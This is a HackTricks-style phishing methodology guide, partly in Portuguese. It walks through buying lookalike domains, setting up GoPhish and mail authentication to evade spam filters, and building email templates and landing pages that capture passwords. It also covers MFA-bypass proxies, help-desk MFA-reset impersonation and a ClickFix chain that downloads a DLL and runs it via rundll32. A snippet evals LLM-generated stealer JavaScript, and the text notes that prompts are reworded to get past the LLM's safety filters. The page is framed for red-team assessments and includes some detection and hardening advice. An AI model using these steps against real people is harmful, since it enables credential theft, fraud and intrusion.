# Phishing Methodology

{{#include ../../banners/hacktricks-training.md}}

## Methodology

1. Recon the victim
1. Select the **victim domain**.
2. Perform some basic web enumeration **searching for login portals** used by the victim and **decide** which one you will **impersonate**.
3. Use some **OSINT** to **find emails**.
2. Prepare the environment
1. **Buy the domain** you are going to use for the phishing assessment
2. **Configure the email service** related records (SPF, DMARC, DKIM, rDNS)
3. Configure the VPS with **gophish**
3. Prepare the campaign
1. Prepare the **email template**
2. Prepare the **web page** to steal the credentials
4. Launch the campaign!

## Generate similar domain names or buy a trusted domain

### Domain Name Variation Techniques

- **Keyword**: The domain name **contains** an important **keyword** of the original domain (e.g., zelster.com-management.com).
- **hypened subdomain**: Change the **dot for a hyphen** of a subdomain (e.g., www-zelster.com).
- **New TLD**: Same domain using a **new TLD** (e.g., zelster.org)
- **Homoglyph**: It **replaces** a letter in the domain name with **letters that look similar** (e.g., zelfser.com).


{{#ref}}
homograph-attacks.md
{{#endref}}
- **Transposition:** It **swaps two letters** within the domain name (e.g., zelsetr.com).
- **Singularization/Pluralization**: Adds or removes “s” at the end of the domain name (e.g., zeltsers.com).
- **Omission**: It **removes one** of the letters from the domain name (e.g., zelser.com).
- **Repetition:** It **repeats one** of the letters in the domain name (e.g., zeltsser.com).
- **Replacement**: Like homoglyph but less stealthy. It replaces one of the letters in the domain name, perhaps with a letter in proximity of the original letter on the keyboard (e.g, zektser.com).
- **Subdomained**: Introduce a **dot** inside the domain name (e.g., ze.lster.com).
- **Insertion**: It **inserts a letter** into the domain name (e.g., zerltser.com).
- **Missing dot**: Append the TLD to the domain name. (e.g., zelstercom.com)

**Automatic Tools**

- [**dnstwist**](https://github.com/elceef/dnstwist)
- [**urlcrazy**](https://github.com/urbanadventurer/urlcrazy)

**Websites**

- [https://dnstwist.it/](https://dnstwist.it)
- [https://dnstwister.report/](https://dnstwister.report)
- [https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/](https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/)

### Bitflipping

There is a **possibility that one of some bits stored or in communication might get automatically flipped** due to various factors like solar flares, cosmic rays, or hardware errors.

When this concept is **applied to DNS requests**, it is possible that the **domain received by the DNS server** is not the same as the domain initially requested.

For example, a single bit modification in the domain "windows.com" can change it to "windnws.com."

Attackers may **take advantage of this by registering multiple bit-flipping domains** that are similar to the victim's domain. Their intention is to redirect legitimate users to their own infrastructure.

For more information read [https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/](https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/)

### Buy a trusted domain

You can search in [https://www.expireddomains.net/](https://www.expireddomains.net) for a expired domain that you could use.\
In order to make sure that the expired domain that you are going to buy **has already a good SEO** you could search how is it categorized in:

- [http://www.fortiguard.com/webfilter](http://www.fortiguard.com/webfilter)
- [https://urlfiltering.paloaltonetworks.com/query/](https://urlfiltering.paloaltonetworks.com/query/)

## Discovering Emails

- [https://github.com/laramies/theHarvester](https://github.com/laramies/theHarvester) (100% free)
- [https://phonebook.cz/](https://phonebook.cz) (100% free)
- [https://maildb.io/](https://maildb.io)
- [https://hunter.io/](https://hunter.io)
- [https://anymailfinder.com/](https://anymailfinder.com)

In order to **discover more** valid email addresses or **verify the ones** you have already discovered you can check if you can brute-force them smtp servers of the victim. [Learn how to verify/discover email address here](../../network-services-pentesting/pentesting-smtp/index.html#username-bruteforce-enumeration).\
Moreover, don't forget that if the users use **any web portal to access their mails**, you can check if it's vulnerable to **username brute force**, and exploit the vulnerability if possible.

## Configuring GoPhish

### Installation

You can download it from [https://github.com/gophish/gophish/releases/tag/v0.11.0](https://github.com/gophish/gophish/releases/tag/v0.11.0)

Download and decompress it inside `/opt/gophish` and execute `/opt/gophish/gophish`\
You will be given a password for the admin user in port 3333 in the output. Therefore, access that port and use those credentials to change the admin password. You may need to tunnel that port to local:
```bash
ssh -L 3333:127.0.0.1:3333 <user>@<ip>
```
### Configuração

**Configuração do certificado TLS**

Antes deste passo, você deve ter **já comprado o domínio** que vai usar e ele deve estar **apontando** para o **IP do VPS** onde você está configurando **gophish**.
```bash
DOMAIN="<domain>"
wget https://dl.eff.org/certbot-auto
chmod +x certbot-auto
sudo apt install snapd
sudo snap install core
sudo snap refresh core
sudo apt-get remove certbot
sudo snap install --classic certbot
sudo ln -s /snap/bin/certbot /usr/bin/certbot
certbot certonly --standalone -d "$DOMAIN"
mkdir /opt/gophish/ssl_keys
cp "/etc/letsencrypt/live/$DOMAIN/privkey.pem" /opt/gophish/ssl_keys/key.pem
cp "/etc/letsencrypt/live/$DOMAIN/fullchain.pem" /opt/gophish/ssl_keys/key.crt​
```
**Configuração de e-mail**

Comece instalando: `apt-get install postfix`

Em seguida, adicione o domínio aos seguintes arquivos:

- **/etc/postfix/virtual_domains**
- **/etc/postfix/transport**
- **/etc/postfix/virtual_regexp**

**Altere também os valores das seguintes variáveis dentro de /etc/postfix/main.cf**

`myhostname = <domain>`\
`mydestination = $myhostname, <domain>, localhost.com, localhost`

Por fim, modifique os arquivos **`/etc/hostname`** e **`/etc/mailname`** para o seu nome de domínio e **reinicie sua VPS.**

Agora, crie um **DNS A record** de `mail.<domain>` apontando para o **endereço IP** da VPS e um **DNS MX** apontando para `mail.<domain>`

Agora vamos testar o envio de um e-mail:
```bash
apt install mailutils
echo "This is the body of the email" | mail -s "This is the subject line" test@email.com
```
**Configuração do Gophish**

Pare a execução do gophish e vamos configurá-lo.\
Modifique `/opt/gophish/config.json` para o seguinte (observe o uso de https):
```bash
{
"admin_server": {
"listen_url": "127.0.0.1:3333",
"use_tls": true,
"cert_path": "gophish_admin.crt",
"key_path": "gophish_admin.key"
},
"phish_server": {
"listen_url": "0.0.0.0:443",
"use_tls": true,
"cert_path": "/opt/gophish/ssl_keys/key.crt",
"key_path": "/opt/gophish/ssl_keys/key.pem"
},
"db_name": "sqlite3",
"db_path": "gophish.db",
"migrations_prefix": "db/db_",
"contact_address": "",
"logging": {
"filename": "",
"level": ""
}
}
```
**Configurar o serviço gophish**

Para criar o serviço gophish de modo que ele possa ser iniciado automaticamente e gerenciado como um serviço, você pode criar o arquivo `/etc/init.d/gophish` com o seguinte conteúdo:
```bash
#!/bin/bash
# /etc/init.d/gophish
# initialization file for stop/start of gophish application server
#
# chkconfig: - 64 36
# description: stops/starts gophish application server
# processname:gophish
# config:/opt/gophish/config.json
# From https://github.com/gophish/gophish/issues/586

# define script variables

processName=Gophish
process=gophish
appDirectory=/opt/gophish
logfile=/var/log/gophish/gophish.log
errfile=/var/log/gophish/gophish.error

start() {
echo 'Starting '${processName}'...'
cd ${appDirectory}
nohup ./$process >>$logfile 2>>$errfile &
sleep 1
}

stop() {
echo 'Stopping '${processName}'...'
pid=$(/bin/pidof ${process})
kill ${pid}
sleep 1
}

status() {
pid=$(/bin/pidof ${process})
if [["$pid" != ""| "$pid" != "" ]]; then
echo ${processName}' is running...'
else
echo ${processName}' is not running...'
fi
}

case $1 in
start|stop|status) "$1" ;;
esac
```
Finalize a configuração do serviço e verifique-o fazendo:
```bash
mkdir /var/log/gophish
chmod +x /etc/init.d/gophish
update-rc.d gophish defaults
#Check the service
service gophish start
service gophish status
ss -l | grep "3333\|443"
service gophish stop
```
## Configurando mail server and domain

### Wait & be legit

Quanto mais antigo for um domínio, menos provável será que seja marcado como spam. Portanto, você deve esperar o máximo de tempo possível (pelo menos 1 semana) antes da avaliação de phishing. Além disso, se você colocar uma página sobre um setor com boa reputação, a reputação obtida será melhor.

Note que, mesmo que você precise esperar uma semana, pode terminar de configurar tudo agora.

### Configure Reverse DNS (rDNS) record

Defina um registro rDNS (PTR) que resolva o endereço IP do VPS para o nome de domínio.

### Sender Policy Framework (SPF) Record

Você deve **configurar um registro SPF para o novo domínio**. Se você não sabe o que é um registro SPF [**leia esta página**](../../network-services-pentesting/pentesting-smtp/index.html#spf).

Você pode usar [https://www.spfwizard.net/](https://www.spfwizard.net) para gerar sua política SPF (use o IP da máquina VPS)

![](<../../images/image (1037).png>)

Este é o conteúdo que deve ser definido dentro de um registro TXT no domínio:
```bash
v=spf1 mx a ip4:ip.ip.ip.ip ?all
```
### Registro Domain-based Message Authentication, Reporting & Conformance (DMARC)

Você deve **configurar um registro DMARC para o novo domínio**. Se você não sabe o que é um registro DMARC [**leia esta página**](../../network-services-pentesting/pentesting-smtp/index.html#dmarc).

Você precisa criar um novo registro DNS TXT apontando o nome de host `_dmarc.<domain>` com o seguinte conteúdo:
```bash
v=DMARC1; p=none
```
### DomainKeys Identified Mail (DKIM)

Você deve **configurar um DKIM para o novo domínio**. Se você não sabe o que é um registro DMARC [**read this page**](../../network-services-pentesting/pentesting-smtp/index.html#dkim).

This tutorial is based on: [https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy)

> [!TIP]
> Você precisa concatenar ambos os valores B64 que a chave DKIM gera:
>
> ```
> v=DKIM1; h=sha256; k=rsa; p=MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA0wPibdqPtzYk81njjQCrChIcHzxOp8a1wjbsoNtka2X9QXCZs+iXkvw++QsWDtdYu3q0Ofnr0Yd/TmG/Y2bBGoEgeE+YTUG2aEgw8Xx42NLJq2D1pB2lRQPW4IxefROnXu5HfKSm7dyzML1gZ1U0pR5X4IZCH0wOPhIq326QjxJZm79E1nTh3xj" "Y9N/Dt3+fVnIbMupzXE216TdFuifKM6Tl6O/axNsbswMS1TH812euno8xRpsdXJzFlB9q3VbMkVWig4P538mHolGzudEBg563vv66U8D7uuzGYxYT4WS8NVm3QBMg0QKPWZaKp+bADLkOSB9J2nUpk4Aj9KB5swIDAQAB
> ```

### Teste a pontuação da configuração do seu e-mail

Você pode fazer isso usando [https://www.mail-tester.com/](https://www.mail-tester.com/)\ Basta acessar a página e enviar um e-mail para o endereço que eles fornecem:
```bash
echo "This is the body of the email" | mail -s "This is the subject line" test-iimosa79z@srv1.mail-tester.com
```
Você também pode **verificar a configuração do seu email** enviando um email para `check-auth@verifier.port25.com` e **ler a resposta** (para isso você precisará **abrir** port **25** e ver a resposta no arquivo _/var/mail/root_ se você enviar o email como root).\
Verifique se você passou em todos os testes:
```bash
==========================================================
Summary of Results
==========================================================
SPF check:          pass
DomainKeys check:   neutral
DKIM check:         pass
Sender-ID check:    pass
SpamAssassin check: ham
```
Você também pode enviar uma **mensagem para uma conta do Gmail sob seu controle** e verificar os **cabeçalhos do e-mail** na sua caixa de entrada do Gmail; `dkim=pass` deve estar presente no campo de cabeçalho `Authentication-Results`.
```
Authentication-Results: mx.google.com;
spf=pass (google.com: domain of contact@example.com designates --- as permitted sender) smtp.mail=contact@example.com;
dkim=pass header.i=@example.com;
```
### Removendo da Spamhouse Blacklist

A página [www.mail-tester.com](https://www.mail-tester.com) pode indicar se o seu domínio está sendo bloqueado pelo spamhouse. Você pode solicitar que seu domínio/IP seja removido em: ​[https://www.spamhaus.org/lookup/](https://www.spamhaus.org/lookup/)

### Removendo da Microsoft Blacklist

​​Você pode solicitar que seu domínio/IP seja removido em [https://sender.office.com/](https://sender.office.com).

## Criar & Lançar Campanha GoPhish

### Perfil de Envio

- Defina um **nome para identificar** o perfil do remetente
- Decida de qual conta você vai enviar os phishing emails. Sugestões: _noreply, support, servicedesk, salesforce..._
- Você pode deixar em branco o nome de usuário e a senha, mas certifique-se de marcar Ignore Certificate Errors

![](<../../images/image (253) (1) (2) (1) (1) (2) (2) (3) (3) (5) (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (10) (15) (2).png>)

> [!TIP]
> É recomendado usar a funcionalidade "**Send Test Email**" para testar se tudo está funcionando.\
> Recomendo **enviar os e-mails de teste para endereços 10min mails** para evitar ser colocado em blacklist ao fazer testes.

### Email Template

- Defina um **nome para identificar** o template
- Em seguida escreva um **assunto** (nada estranho, apenas algo que você esperaria ler em um e-mail normal)
- Certifique-se de marcar "**Add Tracking Image**"
- Escreva o **email template** (você pode usar variáveis como no exemplo a seguir):
```html
<html>
<head>
<title></title>
</head>
<body>
<p class="MsoNormal"><span style="font-size:10.0pt;font-family:&quot;Verdana&quot;,sans-serif;color:black">Dear {{.FirstName}} {{.LastName}},</span></p>
<br />
Note: We require all user to login an a very suspicios page before the end of the week, thanks!<br />
<br />
Regards,</span></p>

WRITE HERE SOME SIGNATURE OF SOMEONE FROM THE COMPANY

<p>{{.Tracker}}</p>
</body>
</html>
```
Note que, **para aumentar a credibilidade do email**, é recomendado usar alguma assinatura presente em um email do cliente. Sugestões:

- Envie um email para um **endereço inexistente** e verifique se a resposta contém alguma assinatura.
- Procure por **emails públicos** como info@ex.com ou press@ex.com ou public@ex.com e envie um email, aguardando a resposta.
- Tente contatar **algum email válido descoberto** e aguarde a resposta

![](<../../images/image (80).png>)

> [!TIP]
> O Email Template também permite **anexar arquivos para enviar**. Se você também deseja roubar challenges NTLM usando arquivos/documentos especialmente crafted [leia esta página](../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md).

### Landing Page

- Escreva um **nome**
- **Escreva o código HTML** da página web. Observe que você pode **importar** páginas web.
- Marque **Capture Submitted Data** e **Capture Passwords**
- Defina um **redirecionamento**

![](<../../images/image (826).png>)

> [!TIP]
> Normalmente você precisará modificar o código HTML da página e fazer alguns testes localmente (talvez usando algum servidor Apache) **até que goste dos resultados.** Então, cole esse código HTML na caixa.\
> Observe que se precisar **usar alguns recursos estáticos** para o HTML (talvez CSS e JS) você pode salvá-los em _**/opt/gophish/static/endpoint**_ e então acessá-los por _**/static/\<filename>**_

> [!TIP]
> Para o redirecionamento você pode **encaminhar os usuários para a página principal legítima** da vítima, ou redirecioná-los para _/static/migration.html_ por exemplo, colocar uma **spinning wheel (**[**https://loading.io/**](https://loading.io)**) por 5 segundos e então indicar que o processo foi bem sucedido**.

### Users & Groups

- Defina um nome
- **Importe os dados** (observe que, para usar o template do exemplo, você precisa do firstname, last name e email address de cada usuário)

![](<../../images/image (163).png>)

### Campaign

Finalmente, crie uma campanha selecionando um nome, o email template, a landing page, a URL, o sending profile e o grupo. Note que a URL será o link enviado às vítimas

Note que o **Sending Profile permite enviar um email de teste para ver como ficará o email de phishing final**:

![](<../../images/image (192).png>)

> [!TIP]
> Eu recomendaria **enviar os emails de teste para 10min mail addresses** para evitar ser listado em blacklists durante os testes.

Uma vez que tudo esteja pronto, apenas lance a campanha!

## Website Cloning

Se por qualquer motivo você quiser clonar o website, confira a seguinte página:


{{#ref}}
clone-a-website.md
{{#endref}}

## Backdoored Documents & Files

Em algumas avaliações de phishing (principalmente para Red Teams) você também vai querer **enviar arquivos contendo algum tipo de backdoor** (talvez um C2 ou algo que apenas dispare uma autenticação).\
Confira a seguinte página para alguns exemplos:


{{#ref}}
phishing-documents.md
{{#endref}}

## Phishing MFA

### Via Proxy MitM

O ataque anterior é bastante inteligente, pois você está falsificando um site real e coletando as informações inseridas pelo usuário. Infelizmente, se o usuário não inseriu a senha correta ou se a aplicação que você falsificou está configurada com 2FA, **essas informações não permitirão que você se passe pelo usuário enganado**.

É aqui que ferramentas como [**evilginx2**](https://github.com/kgretzky/evilginx2)**,** [**CredSniper**](https://github.com/ustayready/CredSniper) e [**muraena**](https://github.com/muraenateam/muraena) são úteis. Essas ferramentas permitem gerar um ataque MitM. Basicamente, o ataque funciona da seguinte forma:

1. Você **falsifica o formulário de login** da página real.
2. O usuário **envia** suas **credenciais** para sua página falsa e a ferramenta encaminha essas credenciais para a página real, **verificando se as credenciais funcionam**.
3. Se a conta estiver configurada com **2FA**, a página MitM solicitará o código e, quando o **usuário o inserir**, a ferramenta o enviará para a página real.
4. Uma vez que o usuário esteja autenticado você (como atacante) terá **capturado as credenciais, o 2FA, o cookie e qualquer informação** de cada interação enquanto a ferramenta realiza o MitM.

### Via VNC

E se ao invés de **enviar a vítima para uma página maliciosa** com aparência igual à original, você a enviar para uma **sessão VNC com um navegador conectado à página real**? Você poderá ver o que ela faz, roubar a senha, o MFA usado, os cookies...\
Você pode fazer isso com [**EvilnVNC**](https://github.com/JoelGMSec/EvilnoVNC)

## Detecting the detection

Obviamente, uma das melhores formas de saber se você foi descoberto é **procurar seu domínio em blacklists**. Se ele aparecer listado, de alguma forma seu domínio foi detectado como suspeito.\
Uma maneira simples de checar se seu domínio aparece em alguma blacklist é usar [https://malwareworld.com/](https://malwareworld.com)

No entanto, existem outras formas de saber se a vítima está **ativamente procurando por atividade de phishing suspeita no ambiente** conforme explicado em:


{{#ref}}
detecting-phising.md
{{#endref}}

Você pode **comprar um domínio com um nome muito similar** ao domínio da vítima **e/ou gerar um certificado** para um **subdomain** de um domínio controlado por você **contendo** a **keyword** do domínio da vítima. Se a **vítima** realizar qualquer tipo de interação **DNS ou HTTP** com eles, você saberá que **ela está ativamente procurando** por domínios suspeitos e você precisará ser muito furtivo.

### Evaluate the phishing

Use [**Phishious** ](https://github.com/Rices/Phishious) para avaliar se seu email irá para a pasta de spam, será bloqueado ou terá sucesso.

## High-Touch Identity Compromise (Help-Desk MFA Reset)

Conjuntos de intrusão modernos cada vez mais pulam iscas por email inteiramente e **miram diretamente o fluxo de trabalho do service-desk / identity-recovery** para derrotar o MFA. O ataque é totalmente "living-off-the-land": uma vez que o operador possui credenciais válidas, eles pivotam com ferramentas administrativas embutidas – nenhum malware é necessário.

### Attack flow
1. Recon the victim
* Harvest personal & corporate details from LinkedIn, data breaches, public GitHub, etc.
* Identify high-value identities (executives, IT, finance) and enumerate the **exact help-desk process** for password / MFA reset.
2. Real-time social engineering
* Phone, Teams or chat the help-desk while impersonating the target (often with **spoofed caller-ID** or **cloned voice**).
* Provide the previously-collected PII to pass knowledge-based verification.
* Convince the agent to **reset the MFA secret** or perform a **SIM-swap** on a registered mobile number.
3. Immediate post-access actions (≤60 min in real cases)
* Establish a foothold through any web SSO portal.
* Enumerate AD / AzureAD with built-ins (no binaries dropped):
```powershell
# list directory groups & privileged roles
Get-ADGroup -Filter * -Properties Members | ?{$_.Members -match $env:USERNAME}

# AzureAD / Graph – list directory roles
Get-MgDirectoryRole | ft DisplayName,Id

# Enumerate devices the account can login to
Get-MgUserRegisteredDevice -UserId <user@corp.local>
```
* Lateral movement with **WMI**, **PsExec**, or legitimate **RMM** agents already whitelisted in the environment.

### Detection & Mitigation
* Treat help-desk identity recovery as a **privileged operation** – require step-up auth & manager approval.
* Deploy **Identity Threat Detection & Response (ITDR)** / **UEBA** rules that alert on:
* MFA method changed + authentication from new device / geo.
* Immediate elevation of the same principal (user-→-admin).
* Record help-desk calls and enforce a **call-back to an already-registered number** before any reset.
* Implement **Just-In-Time (JIT) / Privileged Access** so newly reset accounts do **not** automatically inherit high-privilege tokens.

---

## At-Scale Deception – SEO Poisoning & “ClickFix” Campaigns
Equipes de commodity compensam o custo de operações high-touch com ataques em massa que transformam **motores de busca & redes de anúncios no canal de entrega**.

1. **SEO poisoning / malvertising** impulsiona um resultado falso como `chromium-update[.]site` para os anúncios de topo.
2. A vítima baixa um pequeno **first-stage loader** (frequentemente JS/HTA/ISO). Exemplos observados pela Unit 42:
* `RedLine stealer`
* `Lumma stealer`
* `Lampion Trojan`
3. O loader exfiltra cookies do navegador + bases de credenciais, depois baixa um **silent loader** que decide – *em tempo real* – se deve implantar:
* RAT (e.g. AsyncRAT, RustDesk)
* ransomware / wiper
* componente de persistência (Run key do registry + tarefa agendada)

### Hardening tips
* Bloqueie domínios recém-registrados & aplique **Advanced DNS / URL Filtering** em *search-ads* assim como em e-mail.
* Restrinja a instalação de software a pacotes MSI assinados / Store; negue execução de `HTA`, `ISO`, `VBS` por política.
* Monitore por processos filhos de navegadores que abrem instaladores:
```yaml
- parent_image: /Program Files/Google/Chrome/*
and child_image: *\\*.exe
```
* Faça hunting por LOLBins frequentemente abusados por first-stage loaders (e.g. `regsvr32`, `curl`, `mshta`).

### ClickFix DLL delivery tradecraft (fake CERT update)
* Lure: aviso clonado de um CERT nacional com um botão **Update** que exibe instruções passo-a-passo para “fix”. As vítimas são instruídas a rodar um batch que baixa um DLL e o executa via `rundll32`.
* Typical batch chain observed:
```cmd
echo powershell -Command "Invoke-WebRequest -Uri 'https://example[.]org/notepad2.dll' -OutFile '%TEMP%\notepad2.dll'"
echo timeout /t 10
echo rundll32.exe "%TEMP%\notepad2.dll",notepad
```
* `Invoke-WebRequest` derruba o payload em `%TEMP%`, um pequeno sleep esconde jitter de rede, então `rundll32` chama o entrypoint exportado (`notepad`).
* O DLL beacona a identidade do host e poll a C2 a cada poucos minutos. Tasking remoto chega como **PowerShell codificado em base64** executado oculto e com policy bypass:
```powershell
powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('<b64_task>')) | Invoke-Expression"
```
* Isso preserva a flexibilidade do C2 (o servidor pode trocar tasks sem atualizar o DLL) e esconde janelas de console. Faça hunting por PowerShell filhos de `rundll32.exe` usando `-WindowStyle Hidden` + `FromBase64String` + `Invoke-Expression` juntos.
* Defensores podem procurar callbacks HTTP(S) do tipo `...page.php?tynor=<COMPUTER>sss<USER>` e intervalos de polling de 5 minutos após o carregamento do DLL.

---

## AI-Enhanced Phishing Operations
Atacantes agora encadeiam **LLM & voice-clone APIs** para iscas totalmente personalizadas e interação em tempo real.

| Layer | Example use by threat actor |
|-------|-----------------------------|
|Automação|Gerar & enviar >100 k emails / SMS com texto randomizado & links de tracking.|
|AI Generativa|Produzir emails *one-off* referenciando M&A públicas, piadas internas das redes sociais; voz deep-fake do CEO em golpe de callback.|
|Agentic AI|Registrar domínios autonomamente, raspar OSINT, criar próximos emails quando uma vítima clica mas não submete credenciais.|

**Defence:**
• Adicione **banners dinâmicos** destacando mensagens enviadas por automação não confiável (via anomalias ARC/DKIM).  
• Implemente **frases de desafio biométricas de voz** para solicitações telefônicas de alto risco.  
• Simule continuamente iscas geradas por AI em programas de conscientização – templates estáticos estão obsoletos.

See also – agentic browsing abuse for credential phishing:

{{#ref}}
ai-agent-mode-phishing-abusing-hosted-agent-browsers.md
{{#endref}}

See also – AI agent abuse of local CLI tools and MCP (for secrets inventory and detection):

{{#ref}}
ai-agent-abuse-local-ai-cli-tools-and-mcp.md
{{#endref}}

## LLM-assisted runtime assembly of phishing JavaScript (in-browser codegen)

Atacantes podem entregar HTML com aparência inofensiva e **gerar o stealer em tempo de execução** pedindo a uma **API LLM confiável** por JavaScript, então executando-o no navegador (e.g., `eval` ou `<script>` dinâmico).

1. **Prompt-as-obfuscation:** codifique URLs de exfil/Base64 strings no prompt; itere a redação para contornar filtros de segurança e reduzir alucinações.
2. **Client-side API call:** no carregamento, JS chama um LLM público (Gemini/DeepSeek/etc.) ou um proxy CDN; apenas o prompt/chamada API está presente no HTML estático.
3. **Assemble & exec:** concatene a resposta e execute-a (polimórfico por visita):
```javascript
fetch("https://llm.example/v1/chat",{method:"POST",body:JSON.stringify({messages:[{role:"user",content:promptText}]}),headers:{"Content-Type":"application/json",Authorization:`Bearer ${apiKey}`}})
.then(r=>r.json())
.then(j=>{const payload=j.choices?.[0]?.message?.content; eval(payload);});
```
4. **Phish/exfil:** código gerado personaliza o isco (por exemplo, LogoKit token parsing) e posts creds para o endpoint oculto pelo prompt.

**Características de evasão**
- O tráfego atinge domínios LLM bem conhecidos ou proxies CDN reputáveis; às vezes via WebSockets para um backend.
- Sem payload estático; JS malicioso existe apenas após a renderização.
- Gerações não determinísticas produzem **únicos** stealers por sessão.

**Ideias de detecção**
- Execute sandboxes com JS habilitado; alerte sobre **runtime `eval`/criação dinâmica de scripts originada das respostas LLM**.
- Busque por POSTs front-end para APIs LLM imediatamente seguidos por `eval`/`Function` no texto retornado.
- Alerta sobre domínios LLM não sancionados no tráfego do cliente, além de POSTs de credenciais subsequentes.

---

## MFA Fatigue / Push Bombing Variante – Reinicialização Forçada
Além do push-bombing clássico, os operadores simplesmente **forçam um novo registro de MFA** durante a chamada do help-desk, anulando o token existente do usuário. Qualquer prompt de login subsequente parece legítimo para a vítima.
```text
[Attacker]  →  Help-Desk:  “I lost my phone while travelling, can you unenrol it so I can add a new authenticator?”
[Help-Desk] →  AzureAD: ‘Delete existing methods’ → sends registration e-mail
[Attacker]  →  Completes new TOTP enrolment on their own device
```
Monitore eventos do AzureAD/AWS/Okta onde **`deleteMFA` + `addMFA`** ocorram **em questão de minutos a partir do mesmo IP**.



## Clipboard Hijacking / Pastejacking

Atacantes podem copiar silenciosamente comandos maliciosos para a área de transferência da vítima a partir de uma página web comprometida ou typosquatted e então enganar o usuário para colá‑los em **Win + R**, **Win + X** ou em uma janela de terminal, executando código arbitrário sem qualquer download ou anexo.


{{#ref}}
clipboard-hijacking.md
{{#endref}}

## Mobile Phishing & Malicious App Distribution (Android & iOS)


{{#ref}}
mobile-phishing-malicious-apps.md
{{#endref}}

### Romance-gated APK + WhatsApp pivot (isca de app de namoro)
* O APK incorpora credenciais estáticas e por‑perfil “unlock codes” (sem autenticação no servidor). As vítimas seguem um fluxo falso de exclusividade (login → perfis bloqueados → desbloqueio) e, com os códigos corretos, são redirecionadas para chats do WhatsApp com números `+92` controlados pelo atacante enquanto spyware roda silenciosamente.
* A coleta começa mesmo antes do login: exfil imediata do **device ID**, contatos (como `.txt` do cache) e documentos (imagens/PDF/Office/OpenXML). Um content observer faz upload automático de novas fotos; um scheduled job revarre novos documentos a cada **5 minutes**.
* Persistência: registra‑se em `BOOT_COMPLETED` e mantém um **foreground service** ativo para sobreviver a reinicializações e remoções em segundo plano.

### WhatsApp device-linking hijack via QR social engineering
* Uma página isca (por exemplo, um “channel” falso de ministério/CERT) exibe um WhatsApp Web/Desktop QR e instrui a vítima a escaneá‑lo, adicionando silenciosamente o atacante como um **linked device**.
* O atacante ganha imediatamente visibilidade de chats/contatos até que a sessão seja removida. As vítimas podem ver depois uma notificação “new device linked”; defensores podem caçar por eventos inesperados de link de dispositivo logo após visitas a páginas QR não confiáveis.

### Mobile‑gated phishing to evade crawlers/sandboxes
Operadores cada vez mais colocam seus fluxos de phishing atrás de uma verificação simples de dispositivo para que crawlers de desktop nunca alcancem as páginas finais. Um padrão comum é um pequeno script que testa se o DOM suporta toque e envia o resultado a um endpoint de servidor; clientes não‑móveis recebem HTTP 500 (ou uma página em branco), enquanto usuários mobile recebem todo o fluxo.

Minimal client snippet (typical logic):
```html
<script src="/static/detect_device.js"></script>
```
`detect_device.js` lógica (simplificada):
```javascript
const isMobile = ('ontouchstart' in document.documentElement);
fetch('/detect', {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({is_mobile:isMobile})})
.then(()=>location.reload());
```
Comportamento do servidor frequentemente observado:
- Define um cookie de sessão durante o primeiro carregamento.
- Aceita `POST /detect {"is_mobile":true|false}`.
- Retorna 500 (ou placeholder) às GETs subsequentes quando `is_mobile=false`; serve phishing apenas se for `true`.

Caça e heurísticas de detecção:
- consulta urlscan: `filename:"detect_device.js" AND page.status:500`
- Telemetria Web: sequência de `GET /static/detect_device.js` → `POST /detect` → HTTP 500 para non‑mobile; caminhos legítimos de vítimas mobile retornam 200 com HTML/JS subsequente.
- Bloqueie ou analise com cautela páginas que condicionam conteúdo exclusivamente em `ontouchstart` ou verificações de dispositivo similares.

Dicas de defesa:
- Execute crawlers com mobile‑like fingerprints e JS habilitado para revelar gated content.
- Dispare alertas para respostas 500 suspeitas após `POST /detect` em domínios recém-registrados.

## Referências

- [https://zeltser.com/domain-name-variations-in-phishing/](https://zeltser.com/domain-name-variations-in-phishing/)
- [https://0xpatrik.com/phishing-domains/](https://0xpatrik.com/phishing-domains/)
- [https://darkbyte.net/robando-sesiones-y-bypasseando-2fa-con-evilnovnc/](https://darkbyte.net/robando-sesiones-y-bypasseando-2fa-con-evilnovnc/)
- [https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy)
- [2025 Unit 42 Global Incident Response Report – Social Engineering Edition](https://unit42.paloaltonetworks.com/2025-unit-42-global-incident-response-report-social-engineering-edition/)
- [Silent Smishing – mobile-gated phishing infra and heuristics (Sekoia.io)](https://blog.sekoia.io/silent-smishing-the-hidden-abuse-of-cellular-router-apis/)
- [The Next Frontier of Runtime Assembly Attacks: Leveraging LLMs to Generate Phishing JavaScript in Real Time](https://unit42.paloaltonetworks.com/real-time-malicious-javascript-through-llms/)
- [Love? Actually: Fake dating app used as lure in targeted spyware campaign in Pakistan](https://www.welivesecurity.com/en/eset-research/love-actually-fake-dating-app-used-lure-targeted-spyware-campaign-pakistan/)
- [ESET GhostChat IoCs and samples](https://github.com/eset/malware-ioc/tree/master/ghostchat)

{{#include ../../banners/hacktricks-training.md}}
